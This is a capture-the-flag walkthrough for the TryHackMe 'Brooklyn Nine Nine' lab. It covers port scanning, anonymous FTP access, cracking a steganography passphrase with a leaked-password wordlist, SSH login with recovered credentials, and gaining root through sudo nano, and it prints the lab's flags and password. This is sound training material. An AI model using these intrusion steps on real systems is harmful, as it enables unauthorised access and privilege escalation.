# Brooklyn Nine Nine
![tryhackme_logo](https://user-images.githubusercontent.com/83867734/185771149-cb02c6f2-8476-4ab3-a626-cca8db0a08bf.png)

Difficulty: **Easy**

Compromise the machine and read the user.txt and root.txt.

Tags
--
* Steganography
* FTP
* SSH
* Sudoers

Tools used
--
* nmap
* ftp
* steghide
* stegseek

Machines
--
Attacker:
* Name: attacker_machine
* Operating System: Athena OS
* IP Address: 10.18.98.39

Victim:
* Name: victim_machine
* IP Address: 10.10.199.58
* Other information must be gathered during the attack

## Phase 1: Enumeration
```
sudo nmap -sS -sC -sV 10.10.199.58 -p- -T5 -vvv

<SNIP>
Discovered open port 21/tcp on 10.10.199.58
Discovered open port 22/tcp on 10.10.199.58
Discovered open port 80/tcp on 10.10.199.58
<SNIP>
21/tcp    open     ftp            syn-ack ttl 63 vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.18.98.39
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
<SNIP>
```
## Phase 2: Foothold
Let's access to the FTP server by anonymous user for retrieving the `note_to_jake.txt` file:
```
ftp 10.10.199.58 -n
Connected to 10.10.199.58.
220 (vsFTPd 3.0.3)
ftp> user
(username) anonymous
331 Please specify the password.
Password: 
230 Login successful.
ftp> get note_to_jake.txt
```
Let's read this file:
```
cat note_to_jake.txt 
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```
So Jake is a vulnerable user.

Meanwhile let's visit the HTTP server. If we visit it by the browser and we look for the home page source code, we can read the following content:
```
<!-- Have you ever heard of steganography? -->
```
So we can guess the background image of this website can hide some file. Let's use steghide for this. The file is protected by password, so use `stegcracker` or `stegseek` for cracking it:
```
stegseek brooklyn99.jpg $SECLISTS/Passwords/Leaked-Databases/rockyou-75.txt
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "admin"
[i] Original filename: "note.txt".
[i] Extracting to "brooklyn99.jpg.out".

steghide extract -sf brooklyn99.jpg
Enter passphrase: admin
wrote extracted data to "note.txt".

cat note.txt 

Holts Password:
fluffydog12@ninenine

Enjoy!!
```
So we got a password. Raymond Holt is a character of the show "Brooklyn 99". The username could be `raymond` or `holt`:
```
ssh 10.10.199.58 -l holt

holt@10.10.157.202's password: fluffydog12@ninenine
Last login: Tue May 26 08:59:00 2020 from 10.10.10.18
holt@brookly_nine_nine:~$ cat user.txt
ee11cbb19052e40b07aac0ca060c23ee
```
## Phase 3: Privilege Escalation

Run:
```
sudo -l                                                                    
Matching Defaults entries for holt on brookly_nine_nine:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User holt may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /bin/nano
```
So open the `/root/root.txt` file by `sudo nano` and get its root flag:
```
sudo nano /root/root.txt

-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: 63a9f0ea7bb98050796b649e85481845

Enjoy!!
```